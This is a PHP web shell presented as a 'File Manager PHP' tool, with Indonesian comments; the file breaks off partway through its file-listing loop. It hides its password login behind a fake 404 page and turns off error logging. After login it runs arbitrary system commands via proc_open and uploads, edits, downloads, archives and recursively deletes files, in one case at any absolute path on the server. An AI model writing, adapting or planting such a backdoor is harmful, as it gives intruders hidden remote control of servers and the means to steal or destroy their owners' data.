<?php
@ob_start();
@session_start();
@set_time_limit(0);
@ini_set("max_execution_time", 0);
@ini_set("output_buffering", 0);
error_reporting(0);
ini_set("display_errors", 0);
ini_set("log_errors", 0);
ini_set('error_log', '');

// --- Konfigurasi Baru (dari skrip yang Anda berikan) ---
$pass = "93880f28547fd91b76e33484d560f94d129b8aa250d181307107e3af70c05f5b";

function prototype($k, $v) {
    $_COOKIE[$k] = $v;
    setcookie($k, $v);
}

// --- Autentikasi Baru (dari skrip yang Anda berikan) ---
if(!empty($pass)) {
    if(isset($_POST['pass']) && (hash('sha256', $_POST['pass']) == $pass)) {
        prototype(md5($_SERVER['HTTP_HOST']), $pass);
        // Redirect setelah login berhasil untuk mencegah resubmisi form
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    }
    if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $pass)) {
        hardLogin();
    }
}

function hardLogin() {
    // Selalu kembalikan kode status HTTP 404 saat menampilkan form login
    header('HTTP/1.0 404 Not Found');
    die('<!DOCTYPE html> <html lang="en"> <head> <meta charset="UTF-8"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <meta 
name="viewport" content="width=device-width, initial-scale=1.0"> <link rel="shortcut icon" type="image/png" 
href="https://cdn.shizuosec.id/t7jodwsa35/Shizuosec.webp" /> <style> body { font-family: monospace; } input[type="password"] { border: none; 
padding: 2px; } input[type="password"]:focus { outline: none; } input[type="submit"] { border: none; padding: 4px 20px; background-color: 
#2e313d; color: #FFF; } </style> </head> <body> <form action="" method="post"> <div align="center"> <input type="password" name="pass" 
placeholder=""></div> </form> </body> </html>');
}

// --- Tangani Logout (tetap sama, akan mengarahkan ke form login baru) ---
if (isset($_POST['logout'])) {
    // Hapus cookie autentikasi yang baru
    setcookie(md5($_SERVER['HTTP_HOST']), '', time() - 3600); // Hapus cookie dengan mengatur waktu kedaluwarsa ke masa lalu
    session_destroy();
    session_unset();
    // Redirect kembali ke halaman ini.
    // Karena cookie dan sesi telah dihancurkan, skrip akan menampilkan form login baru.
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// --- Jika Terautentikasi (melalui cookie), Lanjutkan dengan Fungsionalitas File Manager ---

// --- Manajemen Direktori ---
if (isset($_POST['go_dir'])) {
    $dir = realpath($_POST['go_dir']);
    if ($dir && is_dir($dir)) {
        $_SESSION['current_dir'] = $dir;
        unset($_SESSION['view_file'], $_SESSION['edit_file']);
    }
} elseif (!isset($_SESSION['current_dir'])) {
    $_SESSION['current_dir'] = realpath(getcwd());
}
$current_dir = $_SESSION['current_dir'];

// --- Melihat File ---
if (isset($_POST['view_file'])) {
    $vf = realpath($_POST['view_file']);
    if ($vf && is_file($vf) && strpos($vf, $current_dir) === 0) {
        $_SESSION['view_file'] = $vf;
        unset($_SESSION['edit_file']);
    }
}

// --- Mengedit File ---
if (isset($_POST['edit_file'])) {
    $ef = realpath($_POST['edit_file']);
    if ($ef && is_file($ef) && strpos($ef, $current_dir) === 0) {
        $_SESSION['edit_file'] = $ef;
        unset($_SESSION['view_file']);
    }
}

// Simpan konten file yang diedit
if (isset($_POST['edit_content'], $_POST['save_edit_file'])) {
    $f = realpath($_POST['save_edit_file']);
    if ($f && is_file($f) && is_writable($f) && strpos($f, $current_dir) === 0) {
        if (file_put_contents($f, $_POST['edit_content']) !== false) {
            $_SESSION['message'] = ['type' => 'success', 'text' => 'File edited successfully.'];
        } else {
            $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to edit file.'];
        }
    } else {
        $_SESSION['message'] = ['type' => 'error', 'text' => 'Invalid file or not writable.'];
    }
    unset($_SESSION['edit_file']);
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// --- Penghapusan File dan Direktori (Rekursif) ---
function deleteDir($dir) {
    if (!is_dir($dir)) return false;
    $items = scandir($dir);
    $success = true;
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $path = $dir . DIRECTORY_SEPARATOR . $item;
        if (is_dir($path)) {
            if (!deleteDir($path)) $success = false;
        } else {
            if (!@unlink($path)) $success = false;
        }
    }
    if (!@rmdir($dir)) $success = false;
    return $success;
}

// Tangani penghapusan item tunggal
if (isset($_POST['delete_single_item'])) {
    $user_input_path = trim($_POST['delete_item_name']);
    $path_to_actually_delete = null;

    // Attempt 1: Treat as a path relative to current_dir
    $potential_path_relative = $current_dir . DIRECTORY_SEPARATOR . $user_input_path;
    $resolved_path_relative = realpath($potential_path_relative);

    // Attempt 2: Treat as an absolute path
    $resolved_path_absolute = realpath($user_input_path);

    // Prioritize deletion within current_dir if valid and in scope
    if ($resolved_path_relative && (is_file($resolved_path_relative) || is_dir($resolved_path_relative)) && strpos($resolved_path_relative, 
$current_dir) === 0) {
        $path_to_actually_delete = $resolved_path_relative;
    } else {
        // Fallback to absolute path if relative interpretation didn't work or was out of scope
        if ($resolved_path_absolute && (is_file($resolved_path_absolute) || is_dir($resolved_path_absolute))) {
            $path_to_actually_delete = $resolved_path_absolute;
        }
    }

    if ($path_to_actually_delete) {
        if (is_dir($path_to_actually_delete)) {
            if (deleteDir($path_to_actually_delete)) {
                $_SESSION['message'] = ['type' => 'success', 'text' => 'Folder "' . htmlspecialchars(basename($path_to_actually_delete)) . '" deleted successfully.'];
            } else {
                $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to delete folder "' . htmlspecialchars(basename($path_to_actually_delete)) . '".'];
            }
        } elseif (is_file($path_to_actually_delete)) {
            if (@unlink($path_to_actually_delete)) {
                $_SESSION['message'] = ['type' => 'success', 'text' => 'File "' . htmlspecialchars(basename($path_to_actually_delete)) . '" deleted successfully.'];
            } else {
                $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to delete file "' . htmlspecialchars(basename($path_to_actually_delete)) . '".'];
            }
        } else {
            $_SESSION['message'] = ['type' => 'error', 'text' => 'Item not found or not a valid file/folder.'];
        }
    } else {
        $_SESSION['message'] = ['type' => 'error', 'text' => 'Invalid path or item out of scope.'];
    }
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}


// --- Tindakan Massal (Bulk Actions) ---
if (isset($_POST['bulk_action'], $_POST['items']) && is_array($_POST['items'])) {
    $clean_items = array(); // Changed from []
    $success_count = 0;
    $fail_count = 0;
    foreach ($_POST['items'] as $item_path) {
        $r = realpath($item_path);
        if ($r && strpos($r, $current_dir) === 0) {
            $clean_items[] = $r;
        }
    }

    switch ($_POST['bulk_action']) {
        case 'delete':
            foreach ($clean_items as $p) {
                if (is_dir($p) ? deleteDir($p) : @unlink($p)) {
                    $success_count++;
                } else {
                    $fail_count++;
                }
            }
            if ($success_count > 0 && $fail_count == 0) {
                $_SESSION['message'] = ['type' => 'success', 'text' => $success_count . ' item(s) deleted successfully.'];
            } elseif ($success_count > 0 && $fail_count > 0) {
                $_SESSION['message'] = ['type' => 'error', 'text' => $success_count . ' item(s) deleted, ' . $fail_count . ' failed.'];
            } else {
                $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to delete any items.'];
            }
            break;
        case 'zip':
            $zip_file_path = $current_dir . DIRECTORY_SEPARATOR . 'compress.zip';
            $zip = new ZipArchive();

            if ($zip->open($zip_file_path, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) {
                foreach ($clean_items as $p) {
                    if (is_dir($p)) {
                        $base_name = basename($p);
                        $iterator = new RecursiveIteratorIterator(
                            new RecursiveDirectoryIterator($p, RecursiveDirectoryIterator::SKIP_DOTS),
                            RecursiveIteratorIterator::SELF_FIRST
                        );
                        $zip->addEmptyDir($base_name);

                        foreach ($iterator as $file) {
                            $file_path = $file->getRealPath();
                            $relative_path_in_zip = $base_name . DIRECTORY_SEPARATOR . substr($file_path, strlen($p) + 1);

                            if ($file->isFile()) {
                                $zip->addFile($file_path, $relative_path_in_zip);
                            } elseif ($file->isDir()) {
                                if ($file_path !== $p) {
                                    $zip->addEmptyDir($relative_path_in_zip);
                                }
                            }
                        }
                    } else {
                        $zip->addFile($p, basename($p));
                    }
                }
                if ($zip->close()) {
                    $_SESSION['message'] = ['type' => 'success', 'text' => 'Items compressed to compress.zip successfully.'];
                } else {
                    $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to create zip archive.'];
                }
            } else {
                $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to open zip archive.'];
            }
            break;
        case 'tar':
            $tar_file_path = $current_dir . DIRECTORY_SEPARATOR . 'compress.tar';
            $tgz_file_path = $current_dir . DIRECTORY_SEPARATOR . 'compress.tar.gz';
            try {
                @unlink($tar_file_path); @unlink($tgz_file_path);
                $phar = new PharData($tar_file_path);
                foreach ($clean_items as $p) {
                    $base_name = basename($p);
                    if (is_dir($p)) {
                        $phar->addEmptyDir($base_name);
                        $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($p, RecursiveDirectoryIterator::SKIP_DOTS), 
RecursiveIteratorIterator::SELF_FIRST);
                        foreach ($it as $sub) {
                            $sp = $sub->getRealPath();
                            $local = $base_name . DIRECTORY_SEPARATOR . substr($sp, strlen($p)+1);
                            $sub->isDir() ? $phar->addEmptyDir($local) : $phar->addFile($sp, $local);
                        }
                    } else {
                        $phar->addFile($p, $base_name);
                    }
                }
                if ($phar->compress(Phar::GZ)) {
                    $_SESSION['message'] = ['type' => 'success', 'text' => 'Items compressed to compress.tar.gz successfully.'];
                } else {
                    $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to compress to tar.gz.'];
                }
                unset($phar);
                @unlink($tar_file_path);
            } catch (Exception $e) {
                $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to create tar.gz archive: ' . htmlspecialchars($e->getMessage())];
            }
            break;
    }
    header("Location:?dir=".urlencode($current_dir));
    exit;
}

// --- Pembuatan Folder Baru ---
if (isset($_POST['newfolder_name'])) {
    $new_folder_name = trim($_POST['newfolder_name']);
    $full_path = $current_dir . DIRECTORY_SEPARATOR . $new_folder_name;
    if ($new_folder_name && !file_exists($full_path) && strpos(realpath(dirname($full_path)), $current_dir) === 0) {
        if (mkdir($full_path)) {
            $_SESSION['message'] = ['type' => 'success', 'text' => 'Folder "' . htmlspecialchars($new_folder_name) . '" created successfully.'];
        } else {
            $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to create folder "' . htmlspecialchars($new_folder_name) . '".'];
        }
    } else {
        $_SESSION['message'] = ['type' => 'error', 'text' => 'Invalid folder name or already exists.'];
    }
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// --- Pembuatan File Baru ---
if (isset($_POST['create_file'])) { // Perbaikan di sini
    $new_file_name = trim($_POST['newfile_name']);
    $full_path = $current_dir . DIRECTORY_SEPARATOR . $new_file_name;
    if ($new_file_name && !file_exists($full_path) && strpos(realpath(dirname($full_path)), $current_dir) === 0) {
        if (file_put_contents($full_path, "") !== false) {
            $_SESSION['message'] = ['type' => 'success', 'text' => 'File "' . htmlspecialchars($new_file_name) . '" created successfully.'];
        } else {
            $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to create file "' . htmlspecialchars($new_file_name) . '".'];
        }
    } else {
        $_SESSION['message'] = ['type' => 'error', 'text' => 'Invalid file name or already exists.'];
    }
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// --- Upload File ---
if (isset($_FILES['uploadfile'])) {
    $uf = $_FILES['uploadfile'];
    if ($uf['error'] === UPLOAD_ERR_OK) {
        $target_path = $current_dir . DIRECTORY_SEPARATOR . basename($uf['name']);
        if (strpos(realpath(dirname($target_path)), $current_dir) === 0) {
            if (move_uploaded_file($uf['tmp_name'], $target_path)) {
                $_SESSION['message'] = ['type' => 'success', 'text' => 'File "' . htmlspecialchars(basename($uf['name'])) . '" uploaded successfully.'];
            } else {
                $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to upload file "' . htmlspecialchars(basename($uf['name'])) . '".'];
            }
        } else {
            $_SESSION['message'] = ['type' => 'error', 'text' => 'Upload target path out of scope.'];
        }
    } else {
        $_SESSION['message'] = ['type' => 'error', 'text' => 'File upload error: ' . $uf['error']];
    }
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// --- Download File ---
if (isset($_POST['download'])) {
    $dl = realpath($_POST['download']);
    if ($dl && is_file($dl) && strpos($dl, $current_dir) === 0) {
        // Headers and readfile will prevent other output, so no session message needed for download.
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($dl).'"');
        readfile($dl);
        exit;
    } else {
        $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to download file: Invalid path or out of scope.'];
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    }
}

// --- Ganti Nama File/Folder ---
if (isset($_POST['rename'], $_POST['rename_new'])) {
    $o = realpath($_POST['rename']);
    $n = basename($_POST['rename_new']);
    if ($o && $n && strpos($o, $current_dir) === 0) {
        $new_path = dirname($o) . DIRECTORY_SEPARATOR . $n;
        if (strpos(realpath(dirname($new_path)), $current_dir) === 0) {
            if (rename($o, $new_path)) {
                $_SESSION['message'] = ['type' => 'success', 'text' => 'Item "' . htmlspecialchars(basename($o)) . '" renamed to "' . htmlspecialchars($n) . '" successfully.'];
            } else {
                $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to rename "' . htmlspecialchars(basename($o)) . '".'];
            }
        } else {
            $_SESSION['message'] = ['type' => 'error', 'text' => 'New path for rename is out of scope.'];
        }
    } else {
        $_SESSION['message'] = ['type' => 'error', 'text' => 'Invalid rename parameters or old path out of scope.'];
    }
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// --- Ubah Izin File/Folder (Chmod) ---
if (isset($_POST['chmod'], $_POST['chmod_value'])) {
    $t = realpath($_POST['chmod']);
    $cv = $_POST['chmod_value'];
    if ($t && preg_match('/^[0-7]{3,4}$/', $cv) && strpos($t, $current_dir) === 0) {
        if (chmod($t, octdec($cv))) {
            $_SESSION['message'] = ['type' => 'success', 'text' => 'Permissions for "' . htmlspecialchars(basename($t)) . '" changed to ' . htmlspecialchars($cv) . ' successfully.'];
        } else {
            $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to change permissions for "' . htmlspecialchars(basename($t)) . '".'];
        }
    } else {
        $_SESSION['message'] = ['type' => 'error', 'text' => 'Invalid chmod parameters or path out of scope.'];
    }
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// --- Eksekusi Perintah ---
$cmdout = '';
if (isset($_POST['command'])) {
    $des=array(0=>array("pipe","r"),1=>array("pipe","w"),2=>array("pipe","w")); // Changed from []
    $pr=proc_open($_POST['command'],$des,$pipes,$current_dir);
    if (is_resource($pr)) {
        fclose($pipes[0]);
        $out=stream_get_contents($pipes[1]); fclose($pipes[1]);
        $err=stream_get_contents($pipes[2]); fclose($pipes[2]);
        $rc=proc_close($pr);
        $cmdout="<pre>Output:\n".htmlspecialchars($out)."\nError:\n".htmlspecialchars($err)."\nReturn code: $rc</pre>";
    } else $cmdout="Failed to run.";
    // No session message for execute command as per request
}

// --- Fungsi Pembantu ---

// Mengkonversi izin file (oktal) ke string yang mudah dibaca manusia (misalnya, drwxr-xr-x)
function permsToString($perms, $file_path, $current_uid, $current_gid) {
    $info_chars_raw = '';

    $owner_id = fileowner($file_path);
    $group_id = filegroup($file_path);

    $is_regular_file = (($perms & 0x8000) == 0x8000);
    $is_writable_by_owner = (($perms & 0x0080) ? true : false);

    if (($perms & 0xC000) == 0xC000) $info_chars_raw .= 's';
    elseif (($perms & 0xA000) == 0xA000) $info_chars_raw .= 'l';
    elseif (($perms & 0x8000) == 0x8000) $info_chars_raw .= '-';
    elseif (($perms & 0x6000) == 0x6000) $info_chars_raw .= 'b';
    elseif (($perms & 0x4000) == 0x4000) $info_chars_raw .= 'd';
    elseif (($perms & 0x2000) == 0x2000) $info_chars_raw .= 'c';
    elseif (($perms & 0x1000) == 0x1000) $info_chars_raw .= 'p';
    else $info_chars_raw .= 'u';

    $info_chars_raw .= (($perms & 0x0100) ? 'r' : '-');
    $info_chars_raw .= (($perms & 0x0080) ? 'w' : '-');
    $info_chars_raw .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));

    $info_chars_raw .= (($perms & 0x0020) ? 'r' : '-');
    $info_chars_raw .= (($perms & 0x0010) ? 'w' : '-');
    $info_chars_raw .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));

    $info_chars_raw .= (($perms & 0x0004) ? 'r' : '-');
    $info_chars_raw .= (($perms & 0x0002) ? 'w' : '-');
    $info_chars_raw .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));

    $overall_perms_color_style = '';
    if (($owner_id !== $current_uid && $current_uid !== null) || ($group_id !== $current_gid && $current_gid !== null)) {
        $overall_perms_color_style = 'color: white;';
    } else {
        if ($is_writable_by_owner) {
            $overall_perms_color_style = 'color: #00FF00;';
        } else {
            $overall_perms_color_style = 'color: red;';
        }
    }

    $type_char = substr($info_chars_raw, 0, 1);
    $colored_type_char = '';
    if (($perms & 0xC000) == 0xC000) $colored_type_char = '<span style="color:#ADD8E6;">' . $type_char . '</span>';
    elseif (($perms & 0xA000) == 0xA000) $colored_type_char = '<span style="color:#ADD8E6;">' . $type_char . '</span>';
    elseif (($perms & 0x8000) == 0x8000) $colored_type_char = '<span style="color:white;">' . $type_char . '</span>';
    elseif (($perms & 0x6000) == 0x6000) $colored_type_char = '<span style="color:#ADD8E6;">' . $type_char . '</span>';
    elseif (($perms & 0x4000) == 0x4000) $colored_type_char = '<span style="color:#00FF00;">' . $type_char . '</span>';
    elseif (($perms & 0x2000) == 0x2000) $colored_type_char = '<span style="color:#ADD8E6;">' . $type_char . '</span>';
    elseif (($perms & 0x1000) == 0x1000) $colored_type_char = '<span style="color:#ADD8E6;">' . $type_char . '</span>';
    else $colored_type_char = '<span style="color:#ADD8E6;">' . $type_char . '</span>';

    return $colored_type_char . '<span style="' . $overall_perms_color_style . '">' . substr($info_chars_raw, 1) . '</span>';
}

function makeBreadcrumb($path) {
    $path = realpath($path);
    if ($path === false) return "";
    $crumbs = array(); // Changed from []
    $parts = explode(DIRECTORY_SEPARATOR, trim($path, DIRECTORY_SEPARATOR));
    $acc = DIRECTORY_SEPARATOR;
    $crumbs[] = '<form method="POST" style="display:inline"><button type="submit" name="go_dir" 
value="'.htmlspecialchars(DIRECTORY_SEPARATOR).'" 
style="background:none;border:none;color:#ff6666;cursor:pointer;padding:0;margin-right:5px;">/</button></form>';
    foreach ($parts as $p) {
        if (empty($p)) continue;
        $acc .= $p;
        $crumbs[] = '<form method="POST" style="display:inline"><button type="submit" name="go_dir" value="'.htmlspecialchars($acc).'" 
style="background:none;border:none;color:#ff6666;cursor:pointer;padding:0;margin-right:5px;">'.htmlspecialchars($p).'</button></form>';
        $acc .= DIRECTORY_SEPARATOR;
    }
    return implode(' / ', $crumbs);
}

function formatSize($b) {
    if ($b>=1073741824) return number_format($b/1073741824,2)." GB";
    if ($b>=1048576) return number_format($b/1048576,2)." MB";
    if ($b>=1024) return number_format($b/1024,2)." KB";
    return $b." B";
}

// Changed from ?? null
$view_file = isset($_SESSION['view_file']) ? $_SESSION['view_file'] : null;
$edit_file = isset($_SESSION['edit_file']) ? $_SESSION['edit_file'] : null;

$view_content = null;
if ($view_file && !$edit_file && is_file($view_file)) {
    $view_content = file_get_contents($view_file);
}
$edit_content = null;
if ($edit_file && is_file($edit_file)) {
    $edit_content = file_get_contents($edit_file);
}

?>
<!DOCTYPE html>
<html>
<head>
    <title>File Manager PHP</title>
    <style>
        body {
            font-family: monospace;
            background: black;
            color: white;
            margin: 0;
            padding: 10px;
        }
        button.action-btn {
            background: #aa2222;
            border: none;
            color: white;
            padding: 5px 10px;
            margin: 0;
            cursor: pointer;
            border-radius: 3px;
            font-family: monospace;
            font-size: 14px;
        }
        button.action-btn:hover {
            background: #dd4444;
        }
        .actions-cell form {
            display: inline;
            margin: 0;
            padding: 0;
        }
        .actions-cell form:not(:last-child):after {
            content: " | ";
            color: #ff6666;
            padding: 0 4px;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin-bottom: 20px;
        }
        th, td {
            border: 1px solid #444;
            padding: 6px 8px;
            text-align: left;
            vertical-align: middle;
        }
        th {
            background: #222;
        }
        tr:nth-child(even) {
            background: #111;
        }
        .checkbox-col {
            width: 22px;
            text-align: center;
        }
        input[type=text], textarea {
            background: black;
            color: white;
            border: 1px solid #444;
            padding: 4px;
            font-size: 14px;
        }
        input[type=submit] {
            background: #aa2222;
            border: none;
            color: white;
            padding: 6px 12px;
            cursor: pointer;
            border-radius: 3px;
        }
        input[type=submit]:hover {
            background: #dd4444;
        }
        textarea {
            width:100%;
            height:200px;
        }
        /* Style for the new row of action forms */
        .action-row {
            display: flex; /* Use flexbox for alignment */
            align-items: center; /* Vertically center items */
            flex-wrap: wrap; /* Allow items to wrap to the next line if needed */
            margin-bottom: 15px; /* Add some space below the row */
        }
        .action-row form {
            margin-right: 15px; /* Add space between forms */
            margin-bottom: 5px; /* Adjust if forms wrap to next line */
        }
        /* Specific styling for inputs and buttons within the action row to ensure consistent height */
        .action-row input[type="text"],
        .action-row input[type="submit"] {
            height: 30px; /* Set a fixed height for consistency */
            vertical-align: middle; /* Align text fields and buttons */
            box-sizing: border-box; /* Include padding and border in the element's total width and height */
        }
        .command-form {
            margin-top:20px;
            margin-bottom:20px;
        }
        .file-content {
            white-space: pre-wrap;
            background:#111;
            border:1px solid #444;
            padding:10px;
            margin-bottom:20px;
            max-height: 400px;
            overflow-y: auto;
        }
        .edit-form {
            margin-bottom: 20px;
        }
        .debug-message {
            background-color: #333;
            border: 1px solid #666;
            padding: 10px;
            margin-bottom: 15px;
            color: #ffdd00;
            font-size: 0.9em;
        }
        .user-group-diff {
            color: white;
        }
        .perms-green {
            color: #00FF00;
        }
        .perms-red {
            color: red;
        }
        .perms-white {
            color: white;
        }
        .message {
            text-align: center;
            font-weight: bold;
            padding: 10px;
            margin-bottom: 15px;
        }
        .message.success {
            color: #00FF00;
        }
        .message.error {
            color: red;
        }
    </style>
</head>
<body>

<?php
if (isset($_SESSION['delete_debug_message'])) {
    echo '<div class="debug-message">' . $_SESSION['delete_debug_message'] . '</div>';
    unset($_SESSION['delete_debug_message']);
}
?>

<div>
    <strong>Current Directory:</strong> <?php echo makeBreadcrumb($current_dir); ?>
    <form method="POST" style="display:inline;">
        <button type="submit" name="go_dir" value="<?php echo htmlspecialchars(getcwd()); ?>" 
style="background:none;border:none;color:#ff6666;cursor:pointer;padding:0;margin-left:10px;">[ Home ]</button>
    </form>
    <form method="POST" style="display:inline; float:right;">
        <button type="submit" name="logout" 
style="background:none;border:none;color:#ff6666;cursor:pointer;padding:0;margin-left:10px;">Logout</button>
    </form>
</div>
<hr>

<?php if ($edit_file !== null): ?>
    <h3>Edit: <?php echo htmlspecialchars($edit_file); ?></h3>
    <form method="POST" class="edit-form">
        <input type="hidden" name="save_edit_file" value="<?php echo htmlspecialchars($edit_file); ?>">
        <textarea name="edit_content" required><?php echo htmlspecialchars($edit_content); ?></textarea><br>
        <input type="submit" value="Save">
        <button type="button" onclick="window.location='<?php echo $_SERVER['PHP_SELF']; ?>'">Cancel</button>
    </form>
    <hr>
<?php endif; ?>

<div class="command-form">
    <h3>Execute Command</h3>
    <form method="POST" style="margin-bottom:10px;">
        <input type="text" name="command" style="width:80%" required><input type="submit" value="Run">
    </form>
    <?php if ($cmdout): ?>
        <?php echo $cmdout; ?>
    <?php endif; ?>
</div>

<?php if ($view_file !== null && $edit_file === null): ?>
    <h3>Viewing File: <?php echo htmlspecialchars($view_file); ?></h3>
    <pre class="file-content"><?php echo htmlspecialchars($view_content); ?></pre>
    <div class="actions-cell">
        <form method="POST" style="display:inline;">
            <input type="hidden" name="download" value="<?php echo htmlspecialchars($view_file); ?>">
            <button type="submit" class="action-btn">Download</button>
        </form>
        <form method="POST" style="display:inline;">
            <input type="hidden" name="chmod" value="<?php echo htmlspecialchars($view_file); ?>">
            <input type="text" name="chmod_value" placeholder="755" pattern="[0-7]{3,4}" required style="width:50px; vertical-align: middle;">
            <button type="submit" class="action-btn">Chmod</button>
        </form>
        <form method="POST" style="display:inline;">
            <input type="hidden" name="rename" value="<?php echo htmlspecialchars($view_file); ?>">
            <input type="text" name="rename_new" placeholder="Rename to" required style="width:120px; vertical-align: middle;">
            <button type="submit" class="action-btn">Rename</button>
        </form>
        <form method="POST" style="display:inline;">
            <input type="hidden" name="edit_file" value="<?php echo htmlspecialchars($view_file); ?>">
            <button type="submit" class="action-btn">Edit</button>
        </form>
    </div>
    <hr>
<?php endif; ?>

<div class="action-row">
    <form method="POST" enctype="multipart/form-data">
        <input type="file" name="uploadfile" required>
        <input type="submit" value="Upload">
    </form>

    <form method="POST">
        <input type="text" name="newfolder_name" placeholder="Nama folder baru" required>
        <input type="submit" value="Buat Folder">
    </form>

    <form method="POST">
        <input type="text" name="newfile_name" placeholder="Nama file baru" required>
        <input type="submit" name="create_file" value="Buat File">
    </form>

    <form method="POST">
        <input type="text" name="delete_item_name" placeholder="Path file/folder untuk dihapus" required>
        <input type="submit" name="delete_single_item" value="Hapus File/Folder">
    </form>
</div>

<?php
// Display success/error messages here
if (isset($_SESSION['message'])) {
    $message_type = $_SESSION['message']['type'];
    $message_text = $_SESSION['message']['text'];
    echo '<div class="message ' . $message_type . '">' . htmlspecialchars($message_text) . '</div>';
    unset($_SESSION['message']); // Clear the message after displaying it
}
?>

<form method="POST" id="bulkForm">
    <table>
        <thead>
            <tr>
                <th class="checkbox-col"><input type="checkbox" id="checkAll" title="Pilih semua"></th>
                <th>Nama</th>
                <th>Ukuran</th>
                <th>User:Group</th>
                <th>Izin</th>
                <th>Dimodifikasi</th>
                <th class="actions-cell">Aksi</th>
            </tr>
        </thead>
        <tbody>
            <tr>
                <td class="checkbox-col"></td>
                <td>
                    <form method="POST" style="display:inline;">
                        <button type="submit" name="go_dir" value="<?php echo htmlspecialchars($current_dir); ?>" 
style="background:none;border:none;color:#ff6666;cursor:pointer;padding:0;">.</button>
                    </form>
                </td>
                <td>-</td>
                <td>-</td>
                <td>-</td>
                <td>-</td>
                <td class="actions-cell"></td>
            </tr>
            <?php
            $parent_dir = dirname($current_dir);
            if ($parent_dir && is_dir($parent_dir) && $parent_dir !== $current_dir):
            ?>
            <tr>
                <td class="checkbox-col"></td>
                <td>
                    <form method="POST" style="display:inline;">
                        <button type="submit" name="go_dir" value="<?php echo htmlspecialchars($parent_dir); ?>" 
style="background:none;border:none;color:#ff6666;cursor:pointer;padding:0;">..</button>
                    </form>
                </td>
                <td>-</td>
                <td>-</td>
                <td>-</td>
                <td>-</td>
                <td class="actions-cell"></td>
            </tr>
            <?php endif; ?>

            <?php
            $items = scandir($current_dir);
            $folders = array(); // Changed from []
            $files = array(); // Changed from []
            foreach ($items as $item) {
                if ($item === '.' || $item === '..') continue;
                $fullpath = $current_dir . DIRECTORY_SEPARATOR . $item;
                if (is_dir($fullpath)) $folders[] = $item;
                else $files[] = $item;
            }

            $current_uid = function_exists('posix_geteuid') ? posix_geteuid() : null;
            $current_gid = function_exists('posix_getegid') ? posix_getegid() : null;

            foreach ($folders as $item):
                $fullpath = $current_dir . DIRECTORY_SEPARATOR . $item;
                $perms_octal = fileperms($fullpath);
                $perms_string = permsToString($perms_octal, $fullpath, $current_uid, $current_gid);
                $size = is_dir($fullpath) ? '-' : formatSize(filesize($fullpath));
                $mod = date("Y-m-d H:i:s", filemtime($fullpath));

                $owner_id = fileowner($fullpath);
                $group_id = filegroup($fullpath);
                $owner_name = function_exists('posix_getpwuid') ? posix_getpwuid($owner_id)['name'] : $owner_id;
                $group_name = function_exists('posix_getgrgid') ? posix_getgrgid($group_id)['name'] : $group_id;

                $user_group_class = (($owner_id !== $current_uid || $group_id !== $current_gid) && ($current_uid !== null || $current_gid !== 
null)) ? 'user-group-diff' : '';
            ?>
            <tr>
                <td class="checkbox-col"><input type="checkbox" name="items[]" value="<?php echo htmlspecialchars($fullpath); ?>"></td>
                <td>
                    <form method="POST" style="display:inline;">
                        <button type="submit" name="go_dir" value="<?php echo htmlspecialchars($fullpath); ?>" 
style="background:none;border:none;color:#ff6666;cursor:pointer;padding:0;">
                            <?php echo htmlspecialchars($item); ?>
                        </button>
                    </form>
                </td>
                <td><?php echo $size; ?></td>
                <td class="<?php echo $user_group_class; ?>"><?php echo htmlspecialchars($owner_name . ':' . $group_name); ?></td>
                <td><?php echo $perms_string; ?></td>
                <td><?php echo $mod; ?></td>
                <td class="actions-cell">
                    <form method="POST" style="display:inline;">
                        <input type="hidden" name="chmod" value="<?php echo htmlspecialchars($fullpath); ?>">
                        <input type="text" name="chmod_value" placeholder="755" pattern="[0-7]{3,4}" required style="width:50px; 
vertical-align: middle;">
                        <button type="submit" class="action-btn">Chmod</button>
                    </form>
                    <form method="POST" style="display:inline;">
                        <input type="hidden" name="rename" value="<?php echo htmlspecialchars($fullpath); ?>">
                        <input type="text" name="rename_new" placeholder="Ganti nama menjadi" required style="width:120px; vertical-align: 
middle;">
                        <button type="submit" class="action-btn">Ganti Nama</button>
                    </form>
                </td>
            </tr>
            <?php endforeach; ?>

            <?php
            foreach ($files as $item):
                $fullpath = $current_dir . DIRECTORY_SEPARATOR . $item;
                $perms_octal = fileperms($fullpath);
                $perms_string = permsToString($perms_octal, $fullpath, $current_uid, $current_gid);
                $size = formatSize(filesize($fullpath));
                $mod = date("Y-m-d H:i:s", filemtime($fullpath));

                $owner_id = fileowner($fullpath);
                $group_id = filegroup($fullpath);
